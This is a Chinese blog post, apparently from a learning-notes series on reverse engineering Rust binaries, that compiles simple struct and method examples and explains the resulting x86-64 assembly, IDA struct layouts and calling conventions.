            <a href="/2023/11/10/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-4/" class="post-title-link" itemprop="url">Rust逆向学习 (4)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-10 14:41:05 / 修改时间：20:17:51" itemprop="dateCreated datePublished" datetime="2023-11-10T14:41:05+08:00">2023-11-10</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>10 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="reverse-for-struct"><a class="markdownIt-Anchor" href="#reverse-for-struct"></a> Reverse for Struct</h1>
<p>Rust中的结构体是一个重要的内容，由于Rust中没有类的概念，因此其他编程语言中的封装、继承、多态与Rust中的表现都有较大差异。</p>
<p>我们使用参考书中的一个示例开始进行分析。</p>
<h2 id="struct-初始化"><a class="markdownIt-Anchor" href="#struct-初始化"></a> Struct 初始化</h2>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = User &#123;</span><br><span class="line">        email: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>),</span><br><span class="line">        username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>),</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面这段在汇编层是如何处理的呢？</p>
<h3 id="第一段"><a class="markdownIt-Anchor" href="#第一段"></a> 第一段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 296</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        lea     rdi, [rsp + 120]</span><br><span class="line">        mov     edx, 19</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">        lea     rdi, [rsp + 144]</span><br><span class="line">        mov     edx, 15</span><br><span class="line">        call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">        jmp     .LBB17_3</span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">.L__unnamed_5:</span><br><span class="line">        .ascii  &quot;someone@example.com&quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_6:</span><br><span class="line">        .ascii  &quot;someusername123&quot;</span><br></pre></td></tr></table></figure>
<p>上面是第一段汇编内容，在源码中，我们是首先对<code>email</code>进行了初始化，在汇编中也是如此。这里分别将两个字符串实例保存到了<code>[rsp+120]</code>和<code>[rsp+144]</code>处。我们之前分析过，<code>String</code>实例在栈中的大小应该为0x18，可见这两个<code>String</code>实例是完全相邻的，中间没有其他的数据。</p>
<h3 id="第二段"><a class="markdownIt-Anchor" href="#第二段"></a> 第二段</h3>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_3:</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">160</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">64</span>], rax</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">144</span>]</span><br><span class="line">        movaps  xmmword ptr [rsp + <span class="number">48</span>], xmm0</span><br><span class="line">        lea     rax, [rsp + <span class="number">72</span>]</span><br><span class="line">        mov     rcx, qword ptr [rsp + <span class="number">136</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">88</span>], rcx</span><br><span class="line">        movups  xmm0, xmmword ptr [rsp + <span class="number">120</span>]</span><br><span class="line">        movups  xmmword ptr [rsp + <span class="number">72</span>], xmm0</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">96</span>], <span class="number">1</span></span><br><span class="line">        mov     byte ptr [rsp + <span class="number">104</span>], <span class="number">1</span></span><br><span class="line">        mov     qword ptr [rsp + <span class="number">280</span>], rax</span><br><span class="line">        lea     rax, [rip + &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::fmt::Display&gt;::fmt]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">288</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">280</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + <span class="number">288</span>]</span><br><span class="line">        mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">        jmp     .LBB17_6</span><br></pre></td></tr></table></figure>
<p>随后是第二段，这里有一个Rust 1.73与Rust 1.69的不同之处，在老版本中，对于宏将会调用<code>core::fmt::ArgumentV1::new_display</code>将中括号对应的内容转为字符串，而在新版本中，则只会将<code>core::fmt::Display</code>函数地址保存到栈而并不调用。并且结构体中各个元素的内存排列顺序也不相同，通过IDA分析可见在1.73版本中，元素排列与元素定义的顺序相同，但老版本中则不是。这里是因为<code>String</code>实例实现了<code>Display</code>这个<code>Trait</code>，所以能够直接输出。输出时调用的实际上也是<code>Display</code>的<code>Trait</code>。</p>
<p>需要注意的是，第一段中的字符串初始化并不是对结构体的字符串直接进行初始化，而是在栈中另外开辟了0x30大小的空间用于初始化这两个字符串，随后将这段内存的内容复制到结构体中。真正的结构体应该位于<code>[rsp+48]</code>。四个元素的保存地址分别为：<code>[rsp+48]</code>，<code>[rsp+72]</code>，<code>[rsp+96]</code>，<code>[rsp+104]</code>，因此，中间的两条指令<code>mov qword ptr [rsp + 96], 1</code>、<code>mov byte ptr [rsp + 104], 1</code>就是在对<code>sign_in_count</code>和<code>active</code>进行初始化，因为二者一个是整数类型，一个是布尔值，都是不需要通过<code>new</code>进行初始化的，因此可以直接赋值。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> revlab::User struc ; (<span class="keyword">sizeof</span>=<span class="number">0x40</span>, align=<span class="number">0x8</span>, copyof_91)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span>                                         ; _ZN6revlab4main17h1e5ad0972ab6a820E/r</span><br><span class="line"><span class="number">00000000</span> username alloc::<span class="built_in">string</span>::String ?        ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">65</span>/w</span><br><span class="line"><span class="number">00000000</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">72</span>/w</span><br><span class="line"><span class="number">00000018</span> email alloc::<span class="built_in">string</span>::String ?           ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">77</span>/o</span><br><span class="line"><span class="number">00000018</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">84</span>/w ...</span><br><span class="line"><span class="number">00000030</span> sign_in_count dq ?                      ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">93</span>/w</span><br><span class="line"><span class="number">00000038</span> active db ?                             ; XREF: revlab::main::h1e5ad0972ab6a820+<span class="number">9</span>C/w</span><br><span class="line"><span class="number">00000038</span>                                         ; revlab::main::h1e5ad0972ab6a820+<span class="number">11</span>C/o</span><br><span class="line"><span class="number">00000039</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>A db ? ; undefined</span><br><span class="line"><span class="number">0000003B</span> db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>C db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>D db ? ; undefined</span><br><span class="line"><span class="number">0000003</span>E db ? ; undefined</span><br><span class="line"><span class="number">0000003F</span> db ? ; undefined</span><br></pre></td></tr></table></figure>
<h3 id="第三段"><a class="markdownIt-Anchor" href="#第三段"></a> 第三段</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">.LBB17_6:</span><br><span class="line">        mov     rax, qword ptr [rsp + 40]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 32]</span><br><span class="line">        mov     qword ptr [rsp], rcx</span><br><span class="line">        mov     qword ptr [rsp + 8], rax</span><br><span class="line">        lea     rax, [rsp + 104]</span><br><span class="line">        mov     qword ptr [rsp + 264], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;bool as core::fmt::Display&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 272], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 264]</span><br><span class="line">        mov     qword ptr [rsp + 16], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 272]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 24]</span><br><span class="line">        mov     rcx, qword ptr [rsp + 16]</span><br><span class="line">        mov     rdx, qword ptr [rsp + 8]</span><br><span class="line">        mov     rsi, qword ptr [rsp]</span><br><span class="line">        mov     qword ptr [rsp + 216], rsi</span><br><span class="line">        mov     qword ptr [rsp + 224], rdx</span><br><span class="line">        mov     qword ptr [rsp + 232], rcx</span><br><span class="line">        mov     qword ptr [rsp + 240], rax</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_7]</span><br><span class="line">        lea     rdi, [rsp + 168]</span><br><span class="line">        mov     edx, 3</span><br><span class="line">        lea     rcx, [rsp + 216]</span><br><span class="line">        mov     r8d, 2</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        jmp     .LBB17_8</span><br><span class="line">        </span><br><span class="line">.L__unnamed_7:</span><br><span class="line">        .quad   .L__unnamed_2</span><br><span class="line">        .zero   8</span><br><span class="line">        .quad   .L__unnamed_11</span><br><span class="line">        .asciz  &quot;\002\000\000\000\000\000\000&quot;</span><br><span class="line">        .quad   .L__unnamed_12</span><br><span class="line">        .asciz  &quot;\001\000\000\000\000\000\000&quot;</span><br><span class="line">        </span><br><span class="line">.L__unnamed_11:</span><br><span class="line">        .ascii  &quot;, &quot;</span><br><span class="line"></span><br><span class="line">.L__unnamed_12:</span><br><span class="line">        .ascii  &quot;\n&quot;</span><br></pre></td></tr></table></figure>
<p>这一段的工作主要就是输出，通过调试发现，新版rustc在使用<code>println!</code>宏时将不再将临时字符串切片参数保存在栈中，但通过IDA依然可以较为容易地辨别。</p>
<h2 id="struct-作为返回值"><a class="markdownIt-Anchor" href="#struct-作为返回值"></a> Struct 作为返回值</h2>
<p>下面书中给出一个通过函数初始化结构体的实例：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    username: <span class="type">String</span>,</span><br><span class="line">    email: <span class="type">String</span>,</span><br><span class="line">    sign_in_count: <span class="type">u64</span>,</span><br><span class="line">    active: <span class="type">bool</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">build_user</span>(email: <span class="type">String</span>, username: <span class="type">String</span>) <span class="punctuation">-&gt;</span> User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,</span><br><span class="line">        username,</span><br><span class="line">        active: <span class="literal">true</span>,</span><br><span class="line">        sign_in_count: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">user1</span> = <span class="title function_ invoke__">build_user</span>(<span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someone@example.com&quot;</span>), <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;someusername123&quot;</span>));</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;, &#123;&#125;&quot;</span>, user1.email, user1.active);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">example::build_user:</span><br><span class="line">        mov     rax, rdi</span><br><span class="line">        mov     rcx, qword ptr [rdx]</span><br><span class="line">        mov     qword ptr [rdi], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 8]</span><br><span class="line">        mov     qword ptr [rdi + 8], rcx</span><br><span class="line">        mov     rcx, qword ptr [rdx + 16]</span><br><span class="line">        mov     qword ptr [rdi + 16], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi]</span><br><span class="line">        mov     qword ptr [rdi + 24], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 8]</span><br><span class="line">        mov     qword ptr [rdi + 32], rcx</span><br><span class="line">        mov     rcx, qword ptr [rsi + 16]</span><br><span class="line">        mov     qword ptr [rdi + 40], rcx</span><br><span class="line">        mov     qword ptr [rdi + 48], 1</span><br><span class="line">        mov     byte ptr [rdi + 56], 1</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从函数的汇编可以看到，这个函数实际上是将第一个参数作为指针完成初始化的，可以将第一个指针理解为<code>this</code>，这与C++类方法的函数调用规则类似。</p>
<h2 id="实现-debug-trait"><a class="markdownIt-Anchor" href="#实现-debug-trait"></a> 实现 Debug Trait</h2>
<p>一个结构体可以通过<code>#[derive(Debug)]</code>完成对Debug Trait的默认实现：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;rect1 = &#123;:?&#125;&quot;</span>, rect1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 88</span><br><span class="line">        mov     dword ptr [rsp], 30</span><br><span class="line">        mov     dword ptr [rsp + 4], 50</span><br><span class="line">        mov     rax, rsp</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        mov     rax, qword ptr [rip + &lt;example::Rect as core::fmt::Debug&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 80], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 72]</span><br><span class="line">        mov     rax, qword ptr [rsp + 80]</span><br><span class="line">        mov     qword ptr [rsp + 56], rcx</span><br><span class="line">        mov     qword ptr [rsp + 64], rax</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_4]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 56]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 88</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>可以看到，汇编代码中获取的就是<code>Debug</code>这个<code>Trait</code>的函数指针，说明不同的宏实际上调用的函数也不同。如果将<code>&#123;:?&#125;</code>修改为<code>&#123;:#?&#125;</code>，则原先调用的<code>core::fmt::Arguments::new_v1</code>将会改为调用<code>core::fmt::Arguments::new_v1_formatted</code>。考虑到Rust的格式化字符串非常强大与灵活，有多种输出形式，后面将通过专门的分析对宏展开进行分析，这里不深入探讨。</p>
<h2 id="reverse-for-methods"><a class="markdownIt-Anchor" href="#reverse-for-methods"></a> Reverse for Methods</h2>
<p>在Rust中，结构体充当了其他语言中类的功能，可以在结构体下定义方法，使这个方法专属于该结构体。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;area = &#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">area</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">example::Rect::area:</span><br><span class="line">        push    rax</span><br><span class="line">        mov     eax, dword ptr [rdi]</span><br><span class="line">        mul     dword ptr [rdi + 4]</span><br><span class="line">        mov     dword ptr [rsp + 4], eax</span><br><span class="line">        seto    al</span><br><span class="line">        test    al, 1</span><br><span class="line">        jne     .LBB1_2</span><br><span class="line">        mov     eax, dword ptr [rsp + 4]</span><br><span class="line">        pop     rcx</span><br><span class="line">        ret</span><br><span class="line">.LBB1_2:</span><br><span class="line">        lea     rdi, [rip + str.0]</span><br><span class="line">        lea     rdx, [rip + .L__unnamed_4]</span><br><span class="line">        mov     rax, qword ptr [rip + core::panicking::panic@GOTPCREL]</span><br><span class="line">        mov     esi, 33</span><br><span class="line">        call    rax</span><br><span class="line">        ud2</span><br><span class="line"></span><br><span class="line">example::main:</span><br><span class="line">        sub     rsp, 104</span><br><span class="line">        mov     dword ptr [rsp + 8], 30</span><br><span class="line">        mov     dword ptr [rsp + 12], 50</span><br><span class="line">        lea     rdi, [rsp + 8]</span><br><span class="line">        call    example::Rect::area</span><br><span class="line">        mov     dword ptr [rsp + 84], eax</span><br><span class="line">        lea     rax, [rsp + 84]</span><br><span class="line">        mov     qword ptr [rsp + 88], rax</span><br><span class="line">        mov     rax, qword ptr [rip + core::fmt::num::imp::&lt;impl core::fmt::Display for u32&gt;::fmt@GOTPCREL]</span><br><span class="line">        mov     qword ptr [rsp + 96], rax</span><br><span class="line">        mov     rcx, qword ptr [rsp + 88]</span><br><span class="line">        mov     rax, qword ptr [rsp + 96]</span><br><span class="line">        mov     qword ptr [rsp + 64], rcx</span><br><span class="line">        mov     qword ptr [rsp + 72], rax</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">        mov     edx, 2</span><br><span class="line">        lea     rcx, [rsp + 64]</span><br><span class="line">        mov     r8d, 1</span><br><span class="line">        call    core::fmt::Arguments::new_v1</span><br><span class="line">        lea     rdi, [rsp + 16]</span><br><span class="line">        call    qword ptr [rip + std::io::stdio::_print@GOTPCREL]</span><br><span class="line">        add     rsp, 104</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>由上述汇编可知，这里还是将<code>rdi</code>作为<code>self</code>使用。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Rect</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">area</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width * <span class="keyword">self</span>.height</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">can_hold</span>(&amp;<span class="keyword">self</span>, other: &amp;Rect) <span class="punctuation">-&gt;</span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="keyword">self</span>.width &gt; other.width &amp;&amp; <span class="keyword">self</span>.height &gt; other.height</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect1</span> = Rect &#123;width: <span class="number">30</span>, height: <span class="number">50</span>&#125;;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">rect2</span> = Rect &#123;width: <span class="number">10</span>, height: <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, rect1.<span class="title function_ invoke__">can_hold</span>(&amp;rect2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上面的代码，<code>can_hold</code>方法的参数有两个，都是指针，如果将第二个参数的<code>&amp;</code>去掉，则参数有三个。经过试验发现，当一个结构体中的元素数量较少时，不加<code>&amp;</code>可能会将结构体的每个元素分别作为参数传递，当元素数量较多时，则是首先复制然后传递指针。</p>
<p>对于关联函数，由于其第一个参数并不是<code>self</code>，类似于C++中的类静态函数，不需要首先获取结构体实例即可调用，参数传递与一般的函数相同。</p>
<h1 id="reverse-for-enum-part-2"><a class="markdownIt-Anchor" href="#reverse-for-enum-part-2"></a> Reverse for enum (Part 2)</h1>
<p>对于枚举类型，我们在第二篇文章中已经进行了较为详细的解释，对于枚举类型的内存排布有了一定的了解。</p>
<p>下面对枚举类型中定义的方法进行测试。</p>
